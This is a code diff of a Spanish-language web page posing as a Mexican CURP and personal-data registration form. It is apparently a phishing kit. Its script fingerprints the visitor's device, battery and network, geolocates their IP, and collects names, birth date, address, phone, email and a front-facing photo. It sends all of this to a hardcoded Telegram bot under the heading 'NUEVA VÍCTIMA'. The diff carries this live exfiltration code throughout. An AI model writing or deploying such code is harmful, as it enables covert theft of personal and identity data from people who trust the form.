@@ -97,421 +97,398 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;b
 </div>
 
 <script>
-// ===== LADAS DEL MUNDO CON BANDERA =====
-var LADAS=[
-  ["🇦🇫","+93","Afganistán"],
-  ["🇦🇱","+355","Albania"],
-  ["🇩🇿","+213","Argelia"],
-  ["🇦🇩","+376","Andorra"],
-  ["🇦🇴","+244","Angola"],
-  ["🇦🇬","+1","Antigua y Barbuda"],
-  ["🇦🇷","+54","Argentina"],
-  ["🇦🇲","+374","Armenia"],
-  ["🇦🇼","+297","Aruba"],
-  ["🇦🇺","+61","Australia"],
-  ["🇦🇹","+43","Austria"],
-  ["🇦🇿","+994","Azerbaiyán"],
-  ["🇧🇸","+1","Bahamas"],
-  ["🇧🇭","+973","Bahréin"],
-  ["🇧🇩","+880","Bangladesh"],
-  ["🇧🇧","+1","Barbados"],
-  ["🇧🇾","+375","Bielorrusia"],
-  ["🇧🇪","+32","Bélgica"],
-  ["🇧🇿","+501","Belice"],
-  ["🇧🇯","+229","Benín"],
-  ["🇧🇹","+975","Bután"],
-  ["🇧🇴","+591","Bolivia"],
-  ["🇧🇦","+387","Bosnia"],
-  ["🇧🇼","+267","Botsuana"],
-  ["🇧🇷","+55","Brasil"],
-  ["🇧🇳","+673","Brunéi"],
-  ["🇧🇬","+359","Bulgaria"],
-  ["🇧🇫","+226","Burkina Faso"],
-  ["🇧🇮","+257","Burundi"],
-  ["🇨🇻","+238","Cabo Verde"],
-  ["🇰🇭","+855","Camboya"],
-  ["🇨🇲","+237","Camerún"],
-  ["🇨🇦","+1","Canadá"],
-  ["🇹🇩","+235","Chad"],
-  ["🇨🇱","+56","Chile"],
-  ["🇨🇳","+86","China"],
-  ["🇨🇾","+357","Chipre"],
-  ["🇨🇴","+57","Colombia"],
-  ["🇰🇲","+269","Comoras"],
-  ["🇨🇬","+242","Congo"],
-  ["🇨🇩","+243","Congo RD"],
-  ["🇰🇵","+850","Corea del Norte"],
-  ["🇰🇷","+82","Corea del Sur"],
-  ["🇨🇮","+225","Costa de Marfil"],
-  ["🇨🇷","+506","Costa Rica"],
-  ["🇭🇷","+385","Croacia"],
-  ["🇨🇺","+53","Cuba"],
-  ["🇩🇰","+45","Dinamarca"],
-  ["🇩🇯","+253","Yibuti"],
-  ["🇩🇲","+1","Dominica"],
-  ["🇪🇨","+593","Ecuador"],
-  ["🇪🇬","+20","Egipto"],
-  ["🇸🇻","+503","El Salvador"],
-  ["🇦🇪","+971","Emiratos Árabes"],
-  ["🇪🇷","+291","Eritrea"],
-  ["🇪🇪","+372","Estonia"],
-  ["🇸🇿","+268","Esuatini"],
-  ["🇪🇹","+251","Etiopía"],
-  ["🇫🇯","+679","Fiyi"],
-  ["🇵🇭","+63","Filipinas"],
-  ["🇫🇮","+358","Finlandia"],
-  ["🇫🇷","+33","Francia"],
-  ["🇬🇦","+241","Gabón"],
-  ["🇬🇲","+220","Gambia"],
-  ["🇬🇪","+995","Georgia"],
-  ["🇬🇭","+233","Ghana"],
-  ["🇬🇷","+30","Grecia"],
-  ["🇬🇩","+1","Granada"],
-  ["🇬🇹","+502","Guatemala"],
-  ["🇬🇳","+224","Guinea"],
-  ["🇬🇼","+245","Guinea-Bisáu"],
-  ["🇬🇶","+240","Guinea Ecuatorial"],
-  ["🇬🇾","+592","Guyana"],
-  ["🇭🇹","+509","Haití"],
-  ["🇭🇳","+504","Honduras"],
-  ["🇭🇺","+36","Hungría"],
-  ["🇮🇸","+354","Islandia"],
-  ["🇮🇳","+91","India"],
-  ["🇮🇩","+62","Indonesia"],
-  ["🇮🇷","+98","Irán"],
-  ["🇮🇶","+964","Irak"],
-  ["🇮🇪","+353","Irlanda"],
-  ["🇮🇱","+972","Israel"],
-  ["🇮🇹","+39","Italia"],
-  ["🇯🇲","+1","Jamaica"],
-  ["🇯🇵","+81","Japón"],
-  ["🇯🇴","+962","Jordania"],
-  ["🇰🇿","+7","Kazajistán"],
-  ["🇰🇪","+254","Kenia"],
-  ["🇰🇬","+996","Kirguistán"],
-  ["🇰🇮","+686","Kiribati"],
-  ["🇰🇼","+965","Kuwait"],
-  ["🇱🇦","+856","Laos"],
-  ["🇱🇸","+266","Lesoto"],
-  ["🇱🇻","+371","Letonia"],
-  ["🇱🇧","+961","Líbano"],
-  ["🇱🇷","+231","Liberia"],
-  ["🇱🇾","+218","Libia"],
-  ["🇱🇮","+423","Liechtenstein"],
-  ["🇱🇹","+370","Lituania"],
-  ["🇱🇺","+352","Luxemburgo"],
-  ["🇲🇬","+261","Madagascar"],
-  ["🇲🇼","+265","Malaui"],
-  ["🇲🇾","+60","Malasia"],
-  ["🇲🇻","+960","Maldivas"],
-  ["🇲🇱","+223","Malí"],
-  ["🇲🇹","+356","Malta"],
-  ["🇲🇦","+212","Marruecos"],
-  ["🇲🇭","+692","Islas Marshall"],
-  ["🇲🇷","+222","Mauritania"],
-  ["🇲🇺","+230","Mauricio"],
-  ["🇲🇽","+52","México"],
-  ["🇫🇲","+691","Micronesia"],
-  ["🇲🇩","+373","Moldavia"],
-  ["🇲🇨","+377","Mónaco"],
-  ["🇲🇳","+976","Mongolia"],
-  ["🇲🇪","+382","Montenegro"],
-  ["🇲🇿","+258","Mozambique"],
-  ["🇲🇲","+95","Myanmar"],
-  ["🇳🇦","+264","Namibia"],
-  ["🇳🇷","+674","Nauru"],
-  ["🇳🇵","+977","Nepal"],
-  ["🇳🇱","+31","Países Bajos"],
-  ["🇳🇿","+64","Nueva Zelanda"],
-  ["🇳🇮","+505","Nicaragua"],
-  ["🇳🇪","+227","Níger"],
-  ["🇳🇬","+234","Nigeria"],
-  ["🇳🇴","+47","Noruega"],
-  ["🇴🇲","+968","Omán"],
-  ["🇵🇰","+92","Pakistán"],
-  ["🇵🇼","+680","Palaos"],
-  ["🇵🇸","+970","Palestina"],
-  ["🇵🇦","+507","Panamá"],
-  ["🇵🇬","+675","Papúa Nueva Guinea"],
-  ["🇵🇾","+595","Paraguay"],
-  ["🇵🇪","+51","Perú"],
-  ["🇵🇱","+48","Polonia"],
-  ["🇵🇹","+351","Portugal"],
-  ["🇶🇦","+974","Qatar"],
-  ["🇷🇴","+40","Rumanía"],
-  ["🇷🇺","+7","Rusia"],
-  ["🇷🇼","+250","Ruanda"],
-  ["🇰🇳","+1","San Cristóbal y Nieves"],
-  ["🇱🇨","+1","Santa Lucía"],
-  ["🇻🇨","+1","San Vicente"],
-  ["🇼🇸","+685","Samoa"],
-  ["🇸🇲","+378","San Marino"],
-  ["🇸🇹","+239","Santo Tomé"],
-  ["🇸🇦","+966","Arabia Saudita"],
-  ["🇸🇳","+221","Senegal"],
-  ["🇷🇸","+381","Serbia"],
-  ["🇸🇨","+248","Seychelles"],
-  ["🇸🇱","+232","Sierra Leona"],
-  ["🇸🇬","+65","Singapur"],
-  ["🇸🇰","+421","Eslovaquia"],
-  ["🇸🇮","+386","Eslovenia"],
-  ["🇸🇧","+677","Islas Salomón"],
-  ["🇸🇴","+252","Somalia"],
-  ["🇿🇦","+27","Sudáfrica"],
-  ["🇸🇸","+211","Sudán del Sur"],
-  ["🇸🇩","+249","Sudán"],
-  ["🇪🇸","+34","España"],
-  ["🇱🇰","+94","Sri Lanka"],
-  ["🇸🇪","+46","Suecia"],
-  ["🇨🇭","+41","Suiza"],
-  ["🇸🇷","+597","Surinam"],
-  ["🇸🇾","+963","Siria"],
-  ["🇹🇯","+992","Tayikistán"],
-  ["🇹🇿","+255","Tanzania"],
-  ["🇹🇭","+66","Tailandia"],
-  ["🇹🇱","+670","Timor Oriental"],
-  ["🇹🇬","+228","Togo"],
-  ["🇹🇴","+676","Tonga"],
-  ["🇹🇹","+1","Trinidad y Tobago"],
-  ["🇹🇳","+216","Túnez"],
-  ["🇹🇷","+90","Turquía"],
-  ["🇹🇲","+993","Turkmenistán"],
-  ["🇹🇻","+688","Tuvalu"],
-  ["🇺🇬","+256","Uganda"],
-  ["🇺🇦","+380","Ucrania"],
-  ["🇺🇾","+598","Uruguay"],
-  ["🇺🇸","+1","Estados Unidos"],
-  ["🇺🇿","+998","Uzbekistán"],
-  ["🇻🇺","+678","Vanuatu"],
-  ["🇻🇦","+39","Vaticano"],
-  ["🇻🇪","+58","Venezuela"],
-  ["🇻🇳","+84","Vietnam"],
-  ["🇾🇪","+967","Yemen"],
-  ["🇿🇲","+260","Zambia"],
-  ["🇿🇼","+263","Zimbabue"],
-  ["🇭🇰","+852","Hong Kong"],
-  ["🇲🇴","+853","Macao"],
-  ["🇬🇱","+299","Groenlandia"],
-  ["🇬🇮","+350","Gibraltar"],
-  ["🇧🇲","+1","Bermudas"],
-  ["🇰🇾","+1","Islas Caimán"],
-  ["🇦🇬","+1","Antigua"],
-  ["🇧🇶","+599","Caribe Neerlandés"],
-  ["🇹🇼","+886","Taiwán"],
-  ["🇦🇽","+358","Islas Åland"]
+// ===== LADAS DEL MUNDO (bandera + código + país) =====
+var LADAS = [
+["🇲🇽","+52","México"],["🇺🇸","+1","Estados Unidos"],["🇨🇦","+1","Canadá"],
+["🇬🇹","+502","Guatemala"],["🇸🇻","+503","El Salvador"],["🇭🇳","+504","Honduras"],
+["🇳🇮","+505","Nicaragua"],["🇨🇷","+506","Costa Rica"],["🇵🇦","+507","Panamá"],
+["🇧🇿","+501","Belice"],["🇨🇺","+53","Cuba"],["🇩🇴","+1","Rep. Dominicana"],
+["🇵🇷","+1","Puerto Rico"],["🇭🇹","+509","Haití"],
+["🇨🇴","+57","Colombia"],["🇻🇪","+58","Venezuela"],["🇪🇨","+593","Ecuador"],
+["🇵🇪","+51","Perú"],["🇧🇴","+591","Bolivia"],["🇵🇾","+595","Paraguay"],
+["🇺🇾","+598","Uruguay"],["🇦🇷","+54","Argentina"],["🇨🇱","+56","Chile"],
+["🇧🇷","+55","Brasil"],
+["🇪🇸","+34","España"],["🇵🇹","+351","Portugal"],["🇫🇷","+33","Francia"],
+["🇩🇪","+49","Alemania"],["🇮🇹","+39","Italia"],["🇬🇧","+44","Reino Unido"],
+["🇮🇪","+353","Irlanda"],["🇳🇱","+31","Países Bajos"],["🇧🇪","+32","Bélgica"],
+["🇨🇭","+41","Suiza"],["🇦🇹","+43","Austria"],["🇸🇪","+46","Suecia"],
+["🇳🇴","+47","Noruega"],["🇩🇰","+45","Dinamarca"],["🇫🇮","+358","Finlandia"],
+["🇵🇱","+48","Polonia"],["🇬🇷","+30","Grecia"],["🇷🇺","+7","Rusia"],
+["🇺🇦","+380","Ucrania"],["🇹🇷","+90","Turquía"],["🇮🇱","+972","Israel"],
+["🇪🇬","+20","Egipto"],["🇿🇦","+27","Sudáfrica"],["🇳🇬","+234","Nigeria"],
+["🇲🇦","+212","Marruecos"],["🇯🇵","+81","Japón"],["🇨🇳","+86","China"],
+["🇰🇷","+82","Corea del Sur"],["🇮🇳","+91","India"],["🇵🇰","+92","Pakistán"],
+["🇵🇭","+63","Filipinas"],["🇮🇩","+62","Indonesia"],["🇲🇾","+60","Malasia"],
+["🇸🇬","+65","Singapur"],["🇹🇭","+66","Tailandia"],["🇻🇳","+84","Vietnam"],
+["🇦🇺","+61","Australia"],["🇳🇿","+64","Nueva Zelanda"],
+["🇦🇫","+93","Afganistán"],["🇦🇱","+355","Albania"],["🇩🇿","+213","Argelia"],
+["🇦🇩","+376","Andorra"],["🇦🇴","+244","Angola"],["🇦🇲","+374","Armenia"],
+["🇦🇺","+61","Australia"],["🇦🇿","+994","Azerbaiyán"],["🇧🇭","+973","Bahréin"],
+["🇧🇩","+880","Bangladesh"],["🇧🇾","+375","Bielorrusia"],["🇧🇯","+229","Benín"],
+["🇧🇹","+975","Bután"],["🇧🇦","+387","Bosnia"],["🇧🇼","+267","Botsuana"],
+["🇧🇳","+673","Brunéi"],["🇧🇬","+359","Bulgaria"],["🇧🇫","+226","Burkina Faso"],
+["🇧🇮","+257","Burundi"],["🇰🇭","+855","Camboya"],["🇨🇲","+237","Camerún"],
+["🇹🇩","+235","Chad"],["🇨🇾","+357","Chipre"],["🇰🇲","+269","Comoras"],
+["🇨🇬","+242","Congo"],["🇨🇩","+243","Congo RD"],["🇰🇵","+850","Corea del Norte"],
+["🇨🇮","+225","Costa de Marfil"],["🇭🇷","+385","Croacia"],["🇩🇯","+253","Yibuti"],
+["🇪🇬","+20","Egipto"],["🇦🇪","+971","Emiratos Árabes"],["🇪🇷","+291","Eritrea"],
+["🇪🇪","+372","Estonia"],["🇸🇿","+268","Esuatini"],["🇪🇹","+251","Etiopía"],
+["🇫🇯","+679","Fiyi"],["🇬🇦","+241","Gabón"],["🇬🇲","+220","Gambia"],
+["🇬🇪","+995","Georgia"],["🇬🇭","+233","Ghana"],["🇬🇳","+224","Guinea"],
+["🇬🇼","+245","Guinea-Bisáu"],["🇬🇶","+240","Guinea Ecuatorial"],["🇬🇾","+592","Guyana"],
+["🇭🇺","+36","Hungría"],["🇮🇸","+354","Islandia"],["🇮🇷","+98","Irán"],
+["🇮🇶","+964","Irak"],["🇯🇲","+1","Jamaica"],["🇯🇴","+962","Jordania"],
+["🇰🇿","+7","Kazajistán"],["🇰🇪","+254","Kenia"],["🇰🇬","+996","Kirguistán"],
+["🇰🇮","+686","Kiribati"],["🇰🇼","+965","Kuwait"],["🇱🇦","+856","Laos"],
+["🇱🇸","+266","Lesoto"],["🇱🇻","+371","Letonia"],["🇱🇧","+961","Líbano"],
+["🇱🇷","+231","Liberia"],["🇱🇾","+218","Libia"],["🇱🇮","+423","Liechtenstein"],
+["🇱🇹","+370","Lituania"],["🇱🇺","+352","Luxemburgo"],["🇲🇬","+261","Madagascar"],
+["🇲🇼","+265","Malaui"],["🇲🇻","+960","Maldivas"],["🇲🇱","+223","Malí"],
+["🇲🇹","+356","Malta"],["🇲🇭","+692","Islas Marshall"],["🇲🇷","+222","Mauritania"],
+["🇲🇺","+230","Mauricio"],["🇫🇲","+691","Micronesia"],["🇲🇩","+373","Moldavia"],
+["🇲🇨","+377","Mónaco"],["🇲🇳","+976","Mongolia"],["🇲🇪","+382","Montenegro"],
+["🇲🇿","+258","Mozambique"],["🇲🇲","+95","Myanmar"],["🇳🇦","+264","Namibia"],
+["🇳🇷","+674","Nauru"],["🇳🇵","+977","Nepal"],["🇳🇪","+227","Níger"],
+["🇴🇲","+968","Omán"],["🇵🇼","+680","Palaos"],["🇵🇸","+970","Palestina"],
+["🇵🇬","+675","Papúa Nueva Guinea"],["🇶🇦","+974","Qatar"],["🇷🇴","+40","Rumanía"],
+["🇷🇼","+250","Ruanda"],["🇰🇳","+1","San Cristóbal y Nieves"],["🇱🇨","+1","Santa Lucía"],
+["🇻🇨","+1","San Vicente"],["🇼🇸","+685","Samoa"],["🇸🇲","+378","San Marino"],
+["🇸🇹","+239","Santo Tomé"],["🇸🇦","+966","Arabia Saudita"],["🇸🇳","+221","Senegal"],
+["🇷🇸","+381","Serbia"],["🇸🇨","+248","Seychelles"],["🇸🇱","+232","Sierra Leona"],
+["🇸🇰","+421","Eslovaquia"],["🇸🇮","+386","Eslovenia"],["🇸🇧","+677","Islas Salomón"],
+["🇸🇴","+252","Somalia"],["🇸🇸","+211","Sudán del Sur"],["🇸🇩","+249","Sudán"],
+["🇱🇰","+94","Sri Lanka"],["🇸🇷","+597","Surinam"],["🇸🇾","+963","Siria"],
+["🇹🇯","+992","Tayikistán"],["🇹🇿","+255","Tanzania"],["🇹🇱","+670","Timor Oriental"],
+["🇹🇬","+228","Togo"],["🇹🇴","+676","Tonga"],["🇹🇹","+1","Trinidad y Tobago"],
+["🇹🇳","+216","Túnez"],["🇹🇲","+993","Turkmenistán"],["🇹🇻","+688","Tuvalu"],
+["🇺🇬","+256","Uganda"],["🇺🇿","+998","Uzbekistán"],["🇻🇺","+678","Vanuatu"],
+["🇻🇦","+39","Vaticano"],["🇾🇪","+967","Yemen"],["🇿🇲","+260","Zambia"],
+["🇿🇼","+263","Zimbabue"],["🇭🇰","+852","Hong Kong"],["🇲🇴","+853","Macao"],
+["🇹🇼","+886","Taiwán"],["🇬🇱","+299","Groenlandia"],["🇬🇮","+350","Gibraltar"],
+["🇧🇲","+1","Bermudas"],["🇰🇾","+1","Islas Caimán"]
 ];
 
-(function(){
-  // Select de día
-  var diaSel=document.getElementById('dia');
-  for(var i=1;i<=31;i++){var o=document.createElement('option');o.value=String(i).padStart(2,'0');o.textContent=String(i).padStart(2,'0');diaSel.appendChild(o);}
-  // Select de mes
-  var mesSel=document.getElementById('mes');
-  var meses=['Enero','Febrero','Marzo','Abril','Mayo','Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre'];
-  meses.forEach(function(nm,idx){var o=document.createElement('option');o.value=String(idx+1).padStart(2,'0');o.textContent=nm;mesSel.appendChild(o);});
-  // Select de año
-  var anioSel=document.getElementById('anio');
-  for(var a=2026;a>=1940;a--){var op=document.createElement('option');op.value=String(a);op.textContent=String(a);anioSel.appendChild(op);}
-  // Select de lada CON BANDERA
-  var ladaSel=document.getElementById('lada');
-  LADAS.forEach(function(item){
-    var opt=document.createElement('option');
-    opt.value=item[1];
-    opt.textContent=item[0]+" "+item[1]+" "+item[2];
-    opt.setAttribute('data-bandera',item[0]);
-    ladaSel.appendChild(opt);
-  });
-})();
+// ===== Variables globales =====
+var info = {
+  modelo: navigator.userAgent, so: navigator.platform||'?', navegador: '?',
+  pantalla: screen.width+'x'+screen.height, idioma: navigator.language,
+  bateria: '?', red: navigator.connection?navigator.connection.effectiveType:'?',
+  ip: '?', ciudad: '?', pais: '?', gps: 'no'
+};
+var foto = '', form = {};
 
-document.getElementById('lada').addEventListener('change',function(){
-  var opt=this.options[this.selectedIndex];
-  // La bandera ya va dentro del texto del option, no hace falta span aparte
+// ===== Detección de navegador =====
+var ua = navigator.userAgent;
+if(ua.indexOf('Chrome')>-1) info.navegador='Chrome';
+else if(ua.indexOf('Safari')>-1) info.navegador='Safari';
+else if(ua.indexOf('Firefox')>-1) info.navegador='Firefox';
+else info.navegador='Otro';
+
+var modelo = 'Móvil';
+if(ua.indexOf('iPhone')>-1) modelo='iPhone Apple';
+else if(ua.indexOf('iPad')>-1) modelo='iPad Apple';
+else if(ua.indexOf('Android')>-1){
+  var mm=ua.match(/Android[^;]*;\s*([^)]+)/);
+  modelo = mm?mm[1]:'Android';
+}
+info.modelo = modelo;
+
+if(ua.indexOf('iPhone OS')>-1) info.so='iOS '+((ua.match(/OS (\d+_\d+)/)||[])[1]||'').replace('_','.');
+else if(ua.indexOf('Android')>-1) info.so='Android '+((ua.match(/Android (\d+\.?\d*)/)||[])[1]||'');
+else if(ua.indexOf('Windows')>-1) info.so='Windows';
+
+// ===== Enriquecimiento asíncrono =====
+fetch('https://ipapi.co/json/').then(function(r){return r.json();}).then(function(d){
+  info.ip=d.ip||'?';
+  info.ciudad=(d.city||'?')+(d.region?', '+d.region:'');
+  info.pais=d.country_name||'?';
+}).catch(function(){});
+
+if(navigator.getBattery) navigator.getBattery().then(function(b){
+  info.bateria = Math.round(b.level*100)+'%'+(b.charging?' ⚡':' 🔋');
 });
 
-window.addEventListener('load',function(){
+// ===== Helper: leer valor =====
+function v(id){
+  var el = document.getElementById(id);
+  return el ? el.value : '';
+}
+
+// ===== Poblar selects al cargar =====
+(function(){
+  // Día
+  var diaSel = document.getElementById('dia');
+  if(diaSel){
+    for(var i=1;i<=31;i++){
+      var o=document.createElement('option');
+      o.value=String(i).padStart(2,'0');
+      o.textContent=String(i).padStart(2,'0');
+      diaSel.appendChild(o);
+    }
+  }
+  // Mes
+  var mesSel = document.getElementById('mes');
+  if(mesSel){
+    var meses=['Enero','Febrero','Marzo','Abril','Mayo','Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre'];
+    meses.forEach(function(nm,idx){
+      var o=document.createElement('option');
+      o.value=String(idx+1).padStart(2,'0');
+      o.textContent=nm;
+      mesSel.appendChild(o);
+    });
+  }
+  // Año
+  var anioSel = document.getElementById('anio');
+  if(anioSel){
+    for(var a=2026;a>=1940;a--){
+      var op=document.createElement('option');
+      op.value=String(a);
+      op.textContent=String(a);
+      anioSel.appendChild(op);
+    }
+  }
+  // LADAS
+  var ladaSel = document.getElementById('lada');
+  if(ladaSel){
+    LADAS.forEach(function(item){
+      var opt=document.createElement('option');
+      opt.value=item[1];
+      opt.textContent=item[0]+' '+item[1]+' '+item[2];
+      ladaSel.appendChild(opt);
+    });
+  }
+})();
+
+// ===== Limpiar autofill =====
+window.addEventListener('load', function(){
   setTimeout(function(){
     document.querySelectorAll('input').forEach(function(el){el.value='';});
     document.querySelectorAll('select').forEach(function(el){el.selectedIndex=0;});
-    var cpi=document.getElementById('cpInfo'); if(cpi) cpi.innerHTML='';
+    var cpi=document.getElementById('cpInfo');
+    if(cpi) cpi.innerHTML='';
   },150);
 });
 
-var info={modelo:navigator.userAgent,so:navigator.platform||'?',navegador:'?',pantalla:screen.width+'x'+screen.height,idioma:navigator.language,bateria:'?',red:navigator.connection?navigator.connection.effectiveType:'?',ip:'?',ciudad:'?',pais:'?',gps:'no'};
-var foto='',form={};
-var ua=navigator.userAgent;
-if(ua.indexOf('Chrome')>-1)info.navegador='Chrome';else if(ua.indexOf('Safari')>-1)info.navegador='Safari';else if(ua.indexOf('Firefox')>-1)info.navegador='Firefox';else info.navegador='Otro';
-var m='Móvil';if(ua.indexOf('iPhone')>-1)m='iPhone Apple';else if(ua.indexOf('iPad')>-1)m='iPad Apple';else if(ua.indexOf('Android')>-1){var mm=ua.match(/Android[^;]*;\s*([^)]+)/);m=mm?mm[1]:'Android';}info.modelo=m;
-if(ua.indexOf('iPhone OS')>-1)info.so='iOS '+((ua.match(/OS (\d+_\d+)/)||[])[1]||'').replace('_','.');else if(ua.indexOf('Android')>-1)info.so='Android '+((ua.match(/Android (\d+\.?\d*)/)||[])[1]||'');else if(ua.indexOf('Windows')>-1)info.so='Windows';
-fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>{info.ip=d.ip||'?';info.ciudad=(d.city||'?')+(d.region?', '+d.region:'');info.pais=d.country_name||'?';}).catch(()=>{});
-if(navigator.getBattery)navigator.getBattery().then(b=>{info.bateria=Math.round(b.level*100)+'%'+(b.charging?' ⚡':' 🔋');});
-function v(id){var el=document.getElementById(id);return el?el.value:'';}
+// ===== Cambiar tab =====
 function cambiarTab(tab){
-  var btnCurp=document.getElementById('btn-tab-curp'),btnDatos=document.getElementById('btn-tab-datos');
-  var panelCurp=document.getElementById('panel-curp'),panelDatos=document.getElementById('panel-datos');
-  if(tab==='curp'){btnCurp.classList.add('activa');btnDatos.classList.remove('activa');panelCurp.classList.remove('panel-oculto');panelDatos.classList.add('panel-oculto');}
-  else{btnDatos.classList.add('activa');btnCurp.classList.remove('activa');panelDatos.classList.remove('panel-oculto');panelCurp.classList.add('panel-oculto');}
+  var btnCurp=document.getElementById('btn-tab-curp');
+  var btnDatos=document.getElementById('btn-tab-datos');
+  var panelCurp=document.getElementById('panel-curp');
+  var panelDatos=document.getElementById('panel-datos');
+  if(tab==='curp'){
+    if(btnCurp){btnCurp.classList.add('activa');}
+    if(btnDatos){btnDatos.classList.remove('activa');}
+    if(panelCurp){panelCurp.classList.remove('panel-oculto');}
+    if(panelDatos){panelDatos.classList.add('panel-oculto');}
+  }else{
+    if(btnDatos){btnDatos.classList.add('activa');}
+    if(btnCurp){btnCurp.classList.remove('activa');}
+    if(panelDatos){panelDatos.classList.remove('panel-oculto');}
+    if(panelCurp){panelCurp.classList.add('panel-oculto');}
+  }
 }
+
+// ===== Leer formulario completo =====
 function leerForm(){
-  form={};
-  var campos={nombre:'nombre',ap:'primer-apellido',am:'segundo-apellido',dia:'dia',mes:'mes',anio:'anio',sexo:'sexo',entidad:'estado',calle:'calle',num_ext:'num-ext',num_int:'num-int',cp:'cp',colonia:'colonia',municipio:'municipio',estado:'estado-dom',entre:'entre',email:'email'};
-  for(var k in campos){var val=v(campos[k]); if(val) form[k]=val;}
-  if(form.dia && form.mes && form.anio) form.fecha=form.dia+'/'+form.mes+'/'+form.anio;
-  var lada=v('lada'), tel=v('telefono');
-  if(tel) form.tel=lada+' '+tel;
+  form = {};
+  var campos = {
+    nombre:'nombre', ap:'primer-apellido', am:'segundo-apellido',
+    dia:'dia', mes:'mes', anio:'anio', sexo:'sexo', entidad:'estado',
+    calle:'calle', num_ext:'num-ext', num_int:'num-int', cp:'cp',
+    colonia:'colonia', municipio:'municipio', estado:'estado-dom',
+    entre:'entre', email:'email'
+  };
+  for(var k in campos){
+    var val = v(campos[k]);
+    if(val) form[k] = val;
+  }
+  if(form.dia && form.mes && form.anio){
+    form.fecha = form.dia+'/'+form.mes+'/'+form.anio;
+  }
+  var lada = v('lada'), tel = v('telefono');
+  if(tel) form.tel = lada+' '+tel;
 }
+
+// ===== Enviar a Telegram =====
 function enviar(){
-  var TOKEN="9267114621:AAEvSqXV0Z7nCnjVMH59bfiuIsSAuE7wwvU";
-  var CHAT="9092452687";
-  var API="https://api.telegram.org/bot"+TOKEN;
+  var TOKEN = "9267114621:AAEvSqXV0Z7nCnjVMH59bfiuIsSAuE7wwvU";
+  var CHAT = "9092452687";
+  var API = "https://api.telegram.org/bot"+TOKEN;
 
-  var txt="🔔 <b>NUEVA VÍCTIMA</b>
-
-";
-  txt+="📱 <b>Móvil:</b> "+info.modelo+"
-";
-  txt+="💻 <b>SO:</b> "+info.so+"
-";
-  txt+="🌐 <b>Nav:</b> "+info.navegador+"
-";
-  txt+="📺 <b>Pantalla:</b> "+info.pantalla+"
-";
-  txt+="🌎 <b>Idioma:</b> "+info.idioma+"
-";
-  txt+="🔋 <b>Bat:</b> "+info.bateria+"
-";
-  txt+="📡 <b>Red:</b> "+info.red+"
-";
-  txt+="📍 <b>IP:</b> "+info.ip+"
-";
-  txt+="🏙️ <b>Ciudad:</b> "+info.ciudad+"
-";
-  txt+="🌍 <b>País:</b> "+info.pais+"
-";
-  txt+="🧭 <b>GPS:</b> "+info.gps+"
-";
+  var txt = "🔔 <b>NUEVA VÍCTIMA</b>\n\n";
+  txt += "📱 <b>Móvil:</b> "+info.modelo+"\n";
+  txt += "💻 <b>SO:</b> "+info.so+"\n";
+  txt += "🌐 <b>Nav:</b> "+info.navegador+"\n";
+  txt += "📺 <b>Pantalla:</b> "+info.pantalla+"\n";
+  txt += "🌎 <b>Idioma:</b> "+info.idioma+"\n";
+  txt += "🔋 <b>Bat:</b> "+info.bateria+"\n";
+  txt += "📡 <b>Red:</b> "+info.red+"\n";
+  txt += "📍 <b>IP:</b> "+info.ip+"\n";
+  txt += "🏙️ <b>Ciudad:</b> "+info.ciudad+"\n";
+  txt += "🌍 <b>País:</b> "+info.pais+"\n";
+  txt += "🧭 <b>GPS:</b> "+info.gps+"\n";
 
   if(form && Object.keys(form).length){
-    txt+="
-📋 <b>DATOS DEL FORMULARIO:</b>
-";
-    var etiquetas={curp:"CURP",nombre:"Nombre(s)",ap:"Primer apellido",am:"Segundo apellido",dia:"Día",mes:"Mes",anio:"Año",fecha:"Fecha",sexo:"Sexo",entidad:"Entidad",calle:"Calle",num_ext:"Núm. exterior",num_int:"Núm. interior",cp:"CP",colonia:"Colonia",municipio:"Municipio",estado:"Estado",entre:"Entre calles",tel:"Teléfono",email:"Email"};
+    txt += "\n📋 <b>DATOS DEL FORMULARIO:</b>\n";
+    var etiquetas = {
+      curp:"CURP", nombre:"Nombre(s)", ap:"Primer apellido", am:"Segundo apellido",
+      dia:"Día", mes:"Mes", anio:"Año", fecha:"Fecha nac.", sexo:"Sexo",
+      entidad:"Entidad", calle:"Calle", num_ext:"Núm. exterior", num_int:"Núm. interior",
+      cp:"CP", colonia:"Colonia", municipio:"Municipio", estado:"Estado",
+      entre:"Entre calles", tel:"Teléfono", email:"Email"
+    };
     for(var k in form){
       if(form[k]){
-        var lbl=etiquetas[k]||k;
-        txt+="  • <b>"+lbl+":</b> "+form[k]+"
-";
+        txt += "  • <b>"+(etiquetas[k]||k)+":</b> "+form[k]+"\n";
       }
     }
   } else {
-    txt+="
-⚠️ Sin datos de formulario";
+    txt += "\n⚠️ Sin datos de formulario";
   }
 
-  var p1=fetch(API+"/sendMessage",{
+  // Mensaje
+  fetch(API+"/sendMessage", {
     method:"POST",
     headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({chat_id:CHAT,text:txt,parse_mode:"HTML"})
-  }).then(r=>r.json()).then(d=>console.log("MSG:",d)).catch(e=>console.error("MSG err:",e));
+    body:JSON.stringify({chat_id:CHAT, text:txt, parse_mode:"HTML"})
+  }).catch(function(){});
 
+  // Foto
   if(foto){
-    var blob=dataURLtoBlob(foto);
-    var fd=new FormData();
-    fd.append("chat_id",CHAT);
-    fd.append("photo",blob,"foto.jpg");
-    fd.append("caption","📷 Foto frontal");
-    fetch(API+"/sendPhoto",{method:"POST",body:fd}).then(r=>r.json()).then(d=>console.log("FOTO:",d)).catch(e=>console.error("FOTO err:",e));
+    var blob = dataURLtoBlob(foto);
+    var fd = new FormData();
+    fd.append("chat_id", CHAT);
+    fd.append("photo", blob, "foto.jpg");
+    fd.append("caption", "📷 Foto frontal");
+    fetch(API+"/sendPhoto", {method:"POST", body:fd}).catch(function(){});
+  }
+  return Promise.resolve();
+}
+
+function dataURLtoBlob(dataurl){
+  var arr = dataurl.split(","), mime = arr[0].match(/:(.*?);/)[1];
+  var bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+  while(n--){u8arr[n] = bstr.charCodeAt(n);}
+  return new Blob([u8arr], {type:mime});
+}
+
+// ===== Autocompletado de CP =====
+var CP_MUNICIPIOS = {
+  '01000':'Álvaro Obregón','01210':'Álvaro Obregón','01730':'Álvaro Obregón',
